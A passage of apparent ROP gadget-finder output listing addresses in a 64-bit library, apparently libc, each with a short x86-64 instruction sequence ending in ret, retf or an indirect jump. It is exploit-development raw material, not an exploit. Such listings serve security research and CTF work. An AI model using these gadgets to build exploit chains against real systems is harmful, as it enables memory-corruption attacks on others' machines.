0x00002aaaaab5dda5 : ret 0x9874
0x00002aaaaab4abe4 : ret 0x98eb
0x00002aaaaaaff0da : ret 0x9a
0x00002aaaaab17208 : ret 0x9a74
0x00002aaaaac12477 : ret 0x9ae9
0x00002aaaaaba4893 : ret 0x9aeb
0x00002aaaaab8cfc7 : ret 0x9be9
0x00002aaaaab3ff23 : ret 0x9ce9
0x00002aaaaab3d20a : ret 0x9d
0x00002aaaaab7a8d0 : ret 0x9d72
0x00002aaaaab82a18 : ret 0x9e74
0x00002aaaaaaf7f83 : ret 0x9e9
0x00002aaaaab8302c : ret 0x9eb
0x00002aaaaab19e11 : ret 0x9f74
0x00002aaaaabc3161 : ret 0xa
0x00002aaaaac7f9ec : ret 0xa02
0x00002aaaaab4464a : ret 0xa1
0x00002aaaaabbc869 : ret 0xa1e8
0x00002aaaaab10fe8 : ret 0xa274
0x00002aaaaac582a3 : ret 0xa514
0x00002aaaaabbf35d : ret 0xa6e9
0x00002aaaaabff01f : ret 0xa74
0x00002aaaaab8eb82 : ret 0xa8e9
0x00002aaaaac58727 : ret 0xac65
0x00002aaaaac590e4 : ret 0xacfc
0x00002aaaaabca7ed : ret 0xade9
0x00002aaaaabadc2d : ret 0xaeb
0x00002aaaaab7ee3a : ret 0xaf0f
0x00002aaaaaaf5cce : ret 0xaf72
0x00002aaaaab5b1b1 : ret 0xafe9
0x00002aaaaac90ac2 : ret 0xb
0x00002aaaaab568bf : ret 0xb48b
0x00002aaaaab201ad : ret 0xb589
0x00002aaaaab3ea45 : ret 0xb5e8
0x00002aaaaab04459 : ret 0xb60f
0x00002aaaaabd2468 : ret 0xb6e9
0x00002aaaaab91885 : ret 0xb70f
0x00002aaaaabfbc88 : ret 0xb74
0x00002aaaaab4cd0c : ret 0xb76
0x00002aaaaab94b3e : ret 0xb77d
0x00002aaaaabcb483 : ret 0xb7e8
0x00002aaaaab09b83 : ret 0xb8
0x00002aaaaab097b1 : ret 0xb848
0x00002aaaaab01305 : ret 0xb87f
0x00002aaaaab357c8 : ret 0xb908
0x00002aaaaac585ee : ret 0xb9b9
0x00002aaaaaad8189 : ret 0xba88
0x00002aaaaab9dd23 : ret 0xbb
0x00002aaaaab4181d : ret 0xbb41
0x00002aaaaab32fff : ret 0xbbe9
0x00002aaaaab1d8b2 : ret 0xbc41
0x00002aaaaaad7480 : ret 0xbd07
0x00002aaaaabfd9af : ret 0xbd74
0x00002aaaaab2019a : ret 0xbd89
0x00002aaaaab36808 : ret 0xbe08
0x00002aaaaab96c86 : ret 0xbe0f
0x00002aaaaac58344 : ret 0xbe57
0x00002aaaaab28498 : ret 0xbf07
0x00002aaaaab35051 : ret 0xbf08
0x00002aaaaab52b9e : ret 0xbfe9
0x00002aaaaac091d8 : ret 0xbfeb
0x00002aaaaab5f3d9 : ret 0xc000
0x00002aaaaab1742e : ret 0xc001
0x00002aaaaab173e2 : ret 0xc002
0x00002aaaaabf78e7 : ret 0xc019
0x00002aaaaab41072 : ret 0xc031
0x00002aaaaabb1f8a : ret 0xc041
0x00002aaaaabffffa : ret 0xc069
0x00002aaaaab1cd6c : ret 0xc083
0x00002aaaaabd3dd5 : ret 0xc084
0x00002aaaaab619e5 : ret 0xc085
0x00002aaaaabb21cc : ret 0xc141
0x00002aaaaab09a17 : ret 0xc148
0x00002aaaaab1f538 : ret 0xc149
0x00002aaaaac0a4a8 : ret 0xc173
0x00002aaaaab0a8bd : ret 0xc189
0x00002aaaaabdc279 : ret 0xc1e8
0x00002aaaaab1c542 : ret 0xc221
0x00002aaaaab0fba6 : ret 0xc229
0x00002aaaaab0fd40 : ret 0xc269
0x00002aaaaab98431 : ret 0xc26b
0x00002aaaaab583db : ret 0xc275
0x00002aaaaabca05a : ret 0xc283
0x00002aaaaab0ad67 : ret 0xc289
0x00002aaaaac43ca4 : ret 0xc2b2
0x00002aaaaabf1bc0 : ret 0xc2e9
0x00002aaaaab0f6f8 : ret 0xc35b
0x00002aaaaab583dd : ret 0xc3f3
0x00002aaaaabcda90 : ret 0xc3f6
0x00002aaaaac56162 : ret 0xc4c3
0x00002aaaaac57ef8 : ret 0xc4ff
0x00002aaaaac221b8 : ret 0xc580
0x00002aaaaabb9db5 : ret 0xc5e8
0x00002aaaaabe2a6a : ret 0xc601
0x00002aaaaabf6da4 : ret 0xc602
0x00002aaaaabb931e : ret 0xc683
0x00002aaaaab2b263 : ret 0xc689
0x00002aaaaab738f4 : ret 0xc6e8
0x00002aaaaab5bc91 : ret 0xc6eb
0x00002aaaaac03c16 : ret 0xc707
0x00002aaaaabcda1a : ret 0xc72
0x00002aaaaab0c291 : ret 0xc748
0x00002aaaaab192b6 : ret 0xc749
0x00002aaaaab7f3b1 : ret 0xc75
0x00002aaaaab7169f : ret 0xc76
0x00002aaaaab56bae : ret 0xc789
0x00002aaaaabc78bd : ret 0xc7e9
0x00002aaaaab084a8 : ret 0xc801
0x00002aaaaab6cbe1 : ret 0xc829
0x00002aaaaab46cb4 : ret 0xc883
0x00002aaaaaafab9c : ret 0xc985
0x00002aaaaab5de16 : ret 0xc9ff
0x00002aaaaabb2fe2 : ret 0xca39
0x00002aaaaabbf327 : ret 0xca83
0x00002aaaaab31b8d : ret 0xcb73
0x00002aaaaaba763d : ret 0xcb75
0x00002aaaaabca089 : ret 0xcb8
0x00002aaaaac5798a : ret 0xcca7
0x00002aaaaac0045a : ret 0xcd
0x00002aaaaac59a6d : ret 0xcd11
0x00002aaaaab7a8a0 : ret 0xcd72
0x00002aaaaabd61cc : ret 0xcdbb
0x00002aaaaab57d81 : ret 0xce31
0x00002aaaaab06ff8 : ret 0xce80
0x00002aaaaab3146d : ret 0xce83
0x00002aaaaab53cdb : ret 0xcf31
0x00002aaaaab84ed6 : ret 0xd
0x00002aaaaaba6f2e : ret 0xd008
0x00002aaaaabae080 : ret 0xd009
0x00002aaaaab903b3 : ret 0xd021
0x00002aaaaaba1cf2 : ret 0xd029
0x00002aaaaac2202c : ret 0xd073
0x00002aaaaab1bdbf : ret 0xd084
0x00002aaaaab0796e : ret 0xd089
0x00002aaaaab89d3d : ret 0xd0f7
0x00002aaaaabc2bf1 : ret 0xd101
0x00002aaaaabd2e44 : ret 0xd108
0x00002aaaaab34c5d : ret 0xd129
0x00002aaaaabaca1a : ret 0xd138
0x00002aaaaabb0282 : ret 0xd139
0x00002aaaaabb21d3 : ret 0xd141
0x00002aaaaac03d39 : ret 0xd148
0x00002aaaaabdcf69 : ret 0xd1e8
0x00002aaaaab08e55 : ret 0xd231
0x00002aaaaaaf586d : ret 0xd284
0x00002aaaaab73270 : ret 0xd308
0x00002aaaaab36a97 : ret 0xd309
0x00002aaaaab36f73 : ret 0xd329
0x00002aaaaab5a666 : ret 0xd341
0x00002aaaaab113db : ret 0xd348
0x00002aaaaab0b942 : ret 0xd521
0x00002aaaaaad589a : ret 0xd5a4
0x00002aaaaab278e2 : ret 0xd5e9
0x00002aaaaabb4fd3 : ret 0xd609
0x00002aaaaab34ebd : ret 0xd629
0x00002aaaaabafeda : ret 0xd639
0x00002aaaaabdcbbe : ret 0xd6e9
0x00002aaaaab8ea2d : ret 0xd721
0x00002aaaaabb2381 : ret 0xd739
0x00002aaaaabda216 : ret 0xd74
0x00002aaaaab8d979 : ret 0xd76
0x00002aaaaaba0763 : ret 0xd7e8
0x00002aaaaab979a4 : ret 0xd801
0x00002aaaaab7ee3f : ret 0xd889
0x00002aaaaac59505 : ret 0xd8f
0x00002aaaaaaf54df : ret 0xd975
0x00002aaaaababa9d : ret 0xd9eb
0x00002aaaaabf74d0 : ret 0xda21
0x00002aaaaabb2d10 : ret 0xda39
0x00002aaaaabe97b3 : ret 0xda75
0x00002aaaaab09eb1 : ret 0xdaf7
0x00002aaaaabc50d2 : ret 0xdb31
0x00002aaaaaafa39b : ret 0xdb85
0x00002aaaaab8f541 : ret 0xdc00
0x00002aaaaabb6ad1 : ret 0xdc74
0x00002aaaaac595e6 : ret 0xdcd9
0x00002aaaaab5cc1e : ret 0xdce8
0x00002aaaaab9c8f0 : ret 0xdd72
0x00002aaaaabb5133 : ret 0xddeb
0x00002aaaaac58562 : ret 0xde5d
0x00002aaaaab49615 : ret 0xde74
0x00002aaaaac0eba7 : ret 0xde77
0x00002aaaaab1aced : ret 0xde8
0x00002aaaaac572f1 : ret 0xde9e
0x00002aaaaabe3885 : ret 0xdeb
0x00002aaaaab5f299 : ret 0xe000
0x00002aaaaac70d15 : ret 0xe01
0x00002aaaaac44d19 : ret 0xe074
0x00002aaaaaaf8ded : ret 0xe077
0x00002aaaaabf8bf6 : ret 0xe083
0x00002aaaaac7e0f9 : ret 0xe0a
0x00002aaaaac021ca : ret 0xe0ff
0x00002aaaaabb6c9c : ret 0xe174
0x00002aaaaaafd555 : ret 0xe183
0x00002aaaaaaf929b : ret 0xe277
0x00002aaaaaaf5628 : ret 0xe281
0x00002aaaaaafc352 : ret 0xe283
0x00002aaaaab84ffa : ret 0xe2d
0x00002aaaaaaf60b9 : ret 0xe2ff
0x00002aaaaab20173 : ret 0xe383
0x00002aaaaab6a176 : ret 0xe3e9
0x00002aaaaabb6889 : ret 0xe474
0x00002aaaaabf2ee6 : ret 0xe4e8
0x00002aaaaab6afc0 : ret 0xe575
0x00002aaaaab529b7 : ret 0xe675
0x00002aaaaab25583 : ret 0xe680
0x00002aaaaac59706 : ret 0xe71f
0x00002aaaaabad4d6 : ret 0xe775
0x00002aaaaaba7a98 : ret 0xe777
0x00002aaaaab441c2 : ret 0xe8
0x00002aaaaabcf584 : ret 0xe801
0x00002aaaaabad9bb : ret 0xe875
0x00002aaaaab26e85 : ret 0xe87f
0x00002aaaaab4120b : ret 0xe883
0x00002aaaaaba1bdf : ret 0xe8b8
0x00002aaaaaaf5497 : ret 0xe8c1
0x00002aaaaab00a92 : ret 0xe901
0x00002aaaaab04b2e : ret 0xe902
0x00002aaaaaafbec9 : ret 0xe904
0x00002aaaaab8faa1 : ret 0xe907
0x00002aaaaab5dea6 : ret 0xe908
0x00002aaaaac1b276 : ret 0xe910
0x00002aaaaab2070d : ret 0xe920
0x00002aaaaab5a7e3 : ret 0xe96e
0x00002aaaaac57a67 : ret 0xe970
0x00002aaaaab10f2c : ret 0xe974
0x00002aaaaabe5094 : ret 0xe975
0x00002aaaaab5a98c : ret 0xe977
0x00002aaaaaaffcaa : ret 0xea
0x00002aaaaab1b07b : ret 0xea75
0x00002aaaaab7efea : ret 0xea81
0x00002aaaaab2018a : ret 0xeac0
0x00002aaaaabab2b2 : ret 0xeac1
0x00002aaaaab71924 : ret 0xeb01
0x00002aaaaababbaa : ret 0xeb04
0x00002aaaaac192b6 : ret 0xeb10
0x00002aaaaab9e642 : ret 0xeb11
0x00002aaaaab5a7af : ret 0xeb5b
0x00002aaaaab0e4fa : ret 0xeb72
0x00002aaaaac5a218 : ret 0xec2
0x00002aaaaab8d225 : ret 0xec77
0x00002aaaaababdf1 : ret 0xec7f
0x00002aaaaabeda58 : ret 0xed75
0x00002aaaaaafd098 : ret 0xed85
0x00002aaaaabb5217 : ret 0xee72
0x00002aaaaaaf7c8f : ret 0xee75
0x00002aaaaac020cc : ret 0xeee8
0x00002aaaaac59eba : ret 0xef32
0x00002aaaaac0d95a : ret 0xef5c
0x00002aaaaab47a2e : ret 0xef75
0x00002aaaaaba7639 : ret 0xef7c
0x00002aaaaaada691 : ret 0xf
0x00002aaaaab5f159 : ret 0xf000
0x00002aaaaaafa941 : ret 0xf01
0x00002aaaaab36bc1 : ret 0xf02
0x00002aaaaabb0522 : ret 0xf039
0x00002aaaaab41e2d : ret 0xf04
0x00002aaaaab73e13 : ret 0xf077
0x00002aaaaaaf4e5a : ret 0xf08
0x00002aaaaabed97f : ret 0xf089
0x00002aaaaab6e47b : ret 0xf0e
0x00002aaaaab04b37 : ret 0xf0e9
0x00002aaaaab55c50 : ret 0xf0f
0x00002aaaaab2d2ea : ret 0xf10
0x00002aaaaabe39e2 : ret 0xf10e
0x00002aaaaabe37da : ret 0xf110
0x00002aaaaab7367c : ret 0xf188
0x00002aaaaaaf5341 : ret 0xf189
0x00002aaaaabd0649 : ret 0xf1e8
0x00002aaaaab43e5c : ret 0xf20
0x00002aaaaab5f849 : ret 0xf201
0x00002aaaaab41375 : ret 0xf229
0x00002aaaaabc782a : ret 0xf2cf
0x00002aaaaab0c614 : ret 0xf301
0x00002aaaaac5cc98 : ret 0xf377
0x00002aaaaabb9e2a : ret 0xf3a9
0x00002aaaaabf7d1e : ret 0xf3c3
0x00002aaaaab2b7ca : ret 0xf40
0x00002aaaaab6eb4e : ret 0xf41
0x00002aaaaabb08aa : ret 0xf43f
0x00002aaaaabb2f1b : ret 0xf44
0x00002aaaaabb09a5 : ret 0xf45
0x00002aaaaab11bc6 : ret 0xf48
0x00002aaaaab27ef7 : ret 0xf4c
0x00002aaaaabf2a5a : ret 0xf4f5
0x00002aaaaabab676 : ret 0xf53
0x00002aaaaaaf4a3a : ret 0xf58
0x00002aaaaab6b6c5 : ret 0xf5e8
0x00002aaaaab95a18 : ret 0xf601
0x00002aaaaab1eaa2 : ret 0xf631
0x00002aaaaabeda3b : ret 0xf641
0x00002aaaaabed9ab : ret 0xf643
0x00002aaaaab09abb : ret 0xf66
0x00002aaaaac5eda8 : ret 0xf678
0x00002aaaaabd36c4 : ret 0xf683
0x00002aaaaab7ec0c : ret 0xf685
0x00002aaaaabd2fda : ret 0xf6f7
0x00002aaaaab0ad5d : ret 0xf701
0x00002aaaaab568a3 : ret 0xf710
0x00002aaaaab1eb15 : ret 0xf74
0x00002aaaaab1c645 : ret 0xf741
0x00002aaaaab63b3c : ret 0xf748
0x00002aaaaab1d774 : ret 0xf749
0x00002aaaaabd905a : ret 0xf771
0x00002aaaaabe8148 : ret 0xf7e
0x00002aaaaab27bd3 : ret 0xf7e9
0x00002aaaaabb437c : ret 0xf80
0x00002aaaaab5f019 : ret 0xf800
0x00002aaaaab81b7a : ret 0xf810
0x00002aaaaabe35fa : ret 0xf852
0x00002aaaaac571d0 : ret 0xf869
0x00002aaaaab831d5 : ret 0xf883
0x00002aaaaab9a3a5 : ret 0xf889
0x00002aaaaab96679 : ret 0xf8c1
0x00002aaaaaaf600d : ret 0xf8e9
0x00002aaaaabcd9ca : ret 0xf95c
0x00002aaaaabfbc80 : ret 0xf980
0x00002aaaaab38814 : ret 0xf983
0x00002aaaaabc6c3a : ret 0xf9cb
0x00002aaaaab985bf : ret 0xfa29
0x00002aaaaab509e2 : ret 0xfa3e
0x00002aaaaab273c0 : ret 0xfa80
0x00002aaaaab12ee2 : ret 0xfa81
0x00002aaaaaafea79 : ret 0xfa83
0x00002aaaaab48ce2 : ret 0xfabb
0x00002aaaaab07982 : ret 0xfac1
0x00002aaaaabafe9d : ret 0xfad1
0x00002aaaaac164ca : ret 0xfb58
0x00002aaaaabfc031 : ret 0xfb80
0x00002aaaaabae00e : ret 0xfb83
0x00002aaaaab5eed9 : ret 0xfc00
0x00002aaaaab144d6 : ret 0xfc01
0x00002aaaaab1448a : ret 0xfc02
0x00002aaaaabd4231 : ret 0xfc07
0x00002aaaaab318da : ret 0xfc2f
0x00002aaaaab5f869 : ret 0xfc3
0x00002aaaaac69e44 : ret 0xfc52
0x00002aaaaac69c44 : ret 0xfc5c
0x00002aaaaab2cfda : ret 0xfc78
0x00002aaaaac6a130 : ret 0xfc84
0x00002aaaaac6a83c : ret 0xfc9f
0x00002aaaaac6a834 : ret 0xfca0
0x00002aaaaac6a82c : ret 0xfca1
0x00002aaaaac6a824 : ret 0xfca2
0x00002aaaaac6a81c : ret 0xfca3
0x00002aaaaac6a628 : ret 0xfcab
0x00002aaaaab203e2 : ret 0xfd44
0x00002aaaaaba9b3a : ret 0xfd7a
0x00002aaaaab7ed18 : ret 0xfd83
0x00002aaaaabc964a : ret 0xfda2
0x00002aaaaab043e0 : ret 0xfdf
0x00002aaaaab5ed99 : ret 0xfe00
0x00002aaaaab7ed39 : ret 0xfe83
0x00002aaaaabf5738 : ret 0xfe9
0x00002aaaaab19b7a : ret 0xfe90
0x00002aaaaab08ee2 : ret 0xfeb9
0x00002aaaaac21ffe : ret 0xfec5
0x00002aaaaac020bc : ret 0xfee8
0x00002aaaaab5ec59 : ret 0xff00
0x00002aaaaabf86fa : ret 0xff0d
0x00002aaaaab19d4f : ret 0xff2
0x00002aaaaab8b8a0 : ret 0xff25
0x00002aaaaab73ada : ret 0xff3
0x00002aaaaab5d5b5 : ret 0xff31
0x00002aaaaab72d1d : ret 0xff41
0x00002aaaaab003e2 : ret 0xff44
0x00002aaaaab5dd54 : ret 0xff48
0x00002aaaaabd59ca : ret 0xff63
0x00002aaaaab5eb19 : ret 0xff80
0x00002aaaaab11216 : ret 0xff81
0x00002aaaaab111ca : ret 0xff82
0x00002aaaaab38832 : ret 0xff83
0x00002aaaaab3ede9 : ret 0xffaf
0x00002aaaaaaf496b : ret 0xffb8
0x00002aaaaab17317 : ret 0xffbf
0x00002aaaaab5e9d9 : ret 0xffc0
0x00002aaaaab7045c : ret 0xffd0
0x00002aaaaab72c39 : ret 0xffd3
0x00002aaaaab5725a : ret 0xffd5
0x00002aaaaab7074c : ret 0xffd7
0x00002aaaaab5bad1 : ret 0xffdf
0x00002aaaaab5e899 : ret 0xffe0
0x00002aaaaab2cafa : ret 0xffe1
0x00002aaaaab3bb2d : ret 0xffe5
0x00002aaaaaaf5fda : ret 0xffe8
0x00002aaaaaaf6005 : ret 0xffe9
0x00002aaaaac485c1 : ret 0xffea
0x00002aaaaab15f87 : ret 0xffec
0x00002aaaaac6bb81 : ret 0xffed
0x00002aaaaac08537 : ret 0xffee
0x00002aaaaab1058c : ret 0xffef
0x00002aaaaab5e759 : ret 0xfff0
0x00002aaaaab06d08 : ret 0xfff1
0x00002aaaaabc8511 : ret 0xfff2
0x00002aaaaab98c27 : ret 0xfff3
0x00002aaaaab84b6e : ret 0xfff4
0x00002aaaaab72b05 : ret 0xfff5
0x00002aaaaabc3a6e : ret 0xfff6
0x00002aaaaab924a1 : ret 0xfff7
0x00002aaaaab23c76 : ret 0xfff8
0x00002aaaaab096c6 : ret 0xfff9
0x00002aaaaab2615a : ret 0xfffa
0x00002aaaaab000b3 : ret 0xfffb
0x00002aaaaab093c6 : ret 0xfffc
0x00002aaaaab34ac0 : ret 0xfffd
0x00002aaaaabd47f7 : ret 0xfffe
0x00002aaaaab02905 : ret 0xffff
0x00002aaaaaaf46bc : ret 1
0x00002aaaaab20519 : ret 2
0x00002aaaaaad61c8 : ret 3
0x00002aaaaaadc608 : ret 4
0x00002aaaaaad6570 : ret 5
0x00002aaaaaae2da0 : ret 6
0x00002aaaaab7f8fa : ret 7
0x00002aaaaaad6a8c : ret 8
0x00002aaaaac457ca : ret 9
0x00002aaaaac5aca0 : retf -0x1298 ; dec edx ; push 0x68caffed ; in eax, dx ; jmp qword ptr [rdx]
0x00002aaaaac5aca8 : retf -0x1298 ; jmp qword ptr [rdx]
0x00002aaaaac5acb8 : retf -0x1298 ; push rdi ; in eax, dx ; call rdx
0x00002aaaaab6707f : retf -0x7af1 ; call qword ptr [rsi]
0x00002aaaaabebccf : retf -0x7cb8 ; in al, dx ; sbb byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; jmp 0x76d3a62f
0x00002aaaaabd6eda : retf -0xe27 ; dec dword ptr [rax - 0x75] ; jge 0x101eea ; call rbx
0x00002aaaaac7ca1d : retf 0 ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaab0efc3 : retf 0x6411 ; xor rdx, qword ptr [0x30] ; call rdx
0x00002aaaaac2d2eb : retf 3 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac7ca4d : retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaab939f7 : retf ; jmp 0xbea0b
0x00002aaaaac5d335 : retf ; jmp qword ptr [rdi]
0x00002aaaaac17ab3 : retf ; nop dword ptr [rax] ; call qword ptr [rax]
0x00002aaaaac5d485 : retf ; push qword ptr [rdx - 0x24] ; call qword ptr [rcx]
0x00002aaaaab7e665 : rol bl, 0x48 ; mov eax, edi ; ret
0x00002aaaaab7f12e : rol bl, 0x48 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabd3c1c : rol bl, 0x66 ; nop ; mov eax, 1 ; ret
0x00002aaaaab730bc : rol bl, 0x66 ; nop ; mov rax, rdi ; ret
0x00002aaaaab52f38 : rol bl, 0x66 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab62f6d : rol bl, 0x90 ; bsf eax, eax ; lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab7351d : rol bl, 0x90 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab811bd : rol bl, 0x90 ; mov eax, 1 ; ret
0x00002aaaaac44c94 : rol bl, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jl 0x16fcab ; neg eax ; ret
0x00002aaaaab81eeb : rol bl, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab47e8c : rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00002aaaaab6313d : rol bl, 1 ; nop ; xor eax, eax ; ret
0x00002aaaaab0b8c2 : rol bl, 1 ; nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaab0f6c7 : rol byte ptr [rax + 0x375003f], 0x5b ; ret
0x00002aaaaabe500d : rol byte ptr [rax + 0x38], 0xd6 ; cmovne eax, ecx ; ret
0x00002aaaaab73ab2 : rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x00002aaaaab91c82 : rol byte ptr [rax + 0x49000151], 1 ; ret
0x00002aaaaab5fe52 : rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x00002aaaaaad6390 : rol byte ptr [rax + rax], 0 ; ret
0x00002aaaaac55020 : rol byte ptr [rax + rax], 0 ; ret 4
0x00002aaaaab56636 : rol byte ptr [rax + rax], cl ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaaaf9bc0 : rol byte ptr [rax + rcx*2], 0x83 ; ret
0x00002aaaaab3b32c : rol byte ptr [rax + rcx*2], 1 ; ret
0x00002aaaaabf8549 : rol byte ptr [rax + rcx*4 + 0x5e], 3 ; pop rbx ; ret
0x00002aaaaab12320 : rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaac6a9d4 : rol byte ptr [rax - 0x7daf0004], 1 ; cld ; call rax
0x00002aaaaab80d9d : rol byte ptr [rax*4 + 0x751089d2], 0xf3 ; ret
0x00002aaaaac42bcd : rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6bbcd : rol byte ptr [rax], 0 ; mov ah, 0xd0 ; in eax, dx ; call rsp
0x00002aaaaab90a58 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabeae1d : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4062f : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaabd9897 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c390 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab0a69c : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; ret
0x00002aaaaab61c5b : rol byte ptr [rbp + 0x48be75c0], 1 ; add esp, 8 ; ret
0x00002aaaaab6ab22 : rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x00002aaaaab735f9 : rol byte ptr [rbp + 0xfd274c0], 1 ; mov ebp, 0xf80148c0 ; ret
0x00002aaaaab329e1 : rol byte ptr [rbp - 0x3f60f025], 0x29 ; ret
0x00002aaaaab8b6f5 : rol byte ptr [rbp - 0x3f6af037], 0x85 ; ror byte ptr [rdi], cl ; xchg eax, ebp ; ret 0xb60f
0x00002aaaaab0b269 : rol byte ptr [rbp - 0x3f6bf02e], 0xc3 ; xor eax, eax ; ret
0x00002aaaaabf1b67 : rol byte ptr [rbp - 0x6bf0be40], cl ; ret 0x8545
0x00002aaaaabf1d4d : rol byte ptr [rbp - 0x6bf0be40], cl ; ret 0xf741
0x00002aaaaac6aa20 : rol byte ptr [rbp - 0x78af0004], 1 ; cld ; call rax
0x00002aaaaaba9fb1 : rol byte ptr [rbx + 0xa4bb], cl ; add byte ptr [rcx], al ; setg dl ; jmp 0xd4f4a
0x00002aaaaab1d46b : rol byte ptr [rbx - 0x177cfd20], 1 ; ret
0x00002aaaaabed539 : rol byte ptr [rbx - 0x24e6fe08], 0x83 ; ret
0x00002aaaaabd9e2b : rol byte ptr [rbx - 0x34d6fe3d], 1 ; ret
0x00002aaaaabab607 : rol byte ptr [rbx - 0x3f7cfd20], 8 ; ret
0x00002aaaaabdeaec : rol byte ptr [rbx - 0x69f0f601], 0xc0 ; ret
0x00002aaaaab48058 : rol byte ptr [rbx - 0x6af00002], 0xc0 ; neg eax ; ret
0x00002aaaaab02f31 : rol byte ptr [rbx - 0x6bf07f19], 0xc0 ; ret
0x00002aaaaaba5af5 : rol byte ptr [rbx - 0x6bf0fe06], 0xc0 ; ret
0x00002aaaaac6a9dc : rol byte ptr [rbx - 0x7aaf0004], 1 ; cld ; call rax
0x00002aaaaab32f0f : rol byte ptr [rbx - 0x7af00008], cl ; ret
0x00002aaaaab803e2 : rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaac2dad7 : rol byte ptr [rbx], 0 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabf6f16 : rol byte ptr [rbx], 0x25 ; cld ; inc dword ptr [rcx] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac02011 : rol byte ptr [rbx], 0x83 ; ret 0x8303
0x00002aaaaac5c468 : rol byte ptr [rbx], 0xf2 ; jmp rax
0x00002aaaaab7efe1 : rol byte ptr [rcx + 0xbeff], cl ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x00002aaaaabf1b69 : rol byte ptr [rcx + 0xf], 0x94 ; ret 0x8545
0x00002aaaaabf1d4f : rol byte ptr [rcx + 0xf], 0x94 ; ret 0xf741
0x00002aaaaab6b773 : rol byte ptr [rcx + 0xf], 0x95 ; ret
0x00002aaaaab72fb2 : rol byte ptr [rcx + 0xf], 1 ; xchg eax, ebp ; ret 0x3941
0x00002aaaaab8ca7b : rol byte ptr [rcx + 0xf], 1 ; xchg eax, ebx ; ret 0x14c
0x00002aaaaab7306b : rol byte ptr [rcx + 0xf], 1 ; xchg eax, esp ; ret 0x3941
0x00002aaaaabed7de : rol byte ptr [rcx + 0xfa], 0x80 ; cmovne eax, edi ; ret
0x00002aaaaabaa985 : rol byte ptr [rcx + rbp - 0x20], 1 ; ret
0x00002aaaaaafe75b : rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaab8049e : rol byte ptr [rcx + rcx*4 + 0x41], 4 ; jne 0xab470 ; ret
0x00002aaaaabf8202 : rol byte ptr [rcx + rcx*4 - 0x40], cl ; mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaabd75e7 : rol byte ptr [rcx - 0x77], 0xdd ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaab96c9e : rol byte ptr [rcx - 0x77], 1 ; ret 0x8341
0x00002aaaaabafe3e : rol byte ptr [rcx - 0x77], 1 ; ret 0x8d48
0x00002aaaaab967fd : rol byte ptr [rcx - 0x7d], cl ; clc ; add dword ptr [rdi], ecx ; sahf ; ret 0x1fbd
0x00002aaaaab5f842 : rol byte ptr [rcx - 0x80], cl ; stc ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0xf201
0x00002aaaaab803c2 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaabbc54a : rol byte ptr [rcx], 0x39 ; ret
0x00002aaaaabad9b8 : rol byte ptr [rcx], 0x39 ; ret 0xe875
0x00002aaaaabba242 : rol byte ptr [rcx], 0x39 ; ror byte ptr [rdi], 1 ; ret 0x3941
0x00002aaaaab1d082 : rol byte ptr [rcx], 0x48 ; cmp eax, edx ; jne 0x48081 ; xor eax, eax ; ret
0x00002aaaaab6b877 : rol byte ptr [rcx], 0x48 ; sub esi, 1 ; jne 0x9687a ; xor eax, eax ; ret
0x00002aaaaab7edeb : rol byte ptr [rcx], 0x5d ; pop r12 ; pop r13 ; ret
0x00002aaaaabdddcd : rol byte ptr [rcx], 0x66 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaabad697 : rol byte ptr [rcx], 0x83 ; ret 0x4001
0x00002aaaaab00152 : rol byte ptr [rcx], 0x83 ; ret 0x4801
0x00002aaaaabadd4d : rol byte ptr [rcx], 0x89 ; cmp byte ptr [rax - 0x75], r9b ; or byte ptr [r9 + 0x63], r9b ; ret 0x4c6
0x00002aaaaab43e57 : rol byte ptr [rcx], 0x8b ; adc esi, esi ; ret 0xf20
0x00002aaaaab1b06a : rol byte ptr [rcx], 0xc6 ; jmp qword ptr [rax]
0x00002aaaaabd6577 : rol byte ptr [rcx], 0xd9 ; ret 0x3944
0x00002aaaaab72f72 : rol byte ptr [rcx], 0xf ; mov esi, 0xc984070c ; jne 0x9df73 ; ret
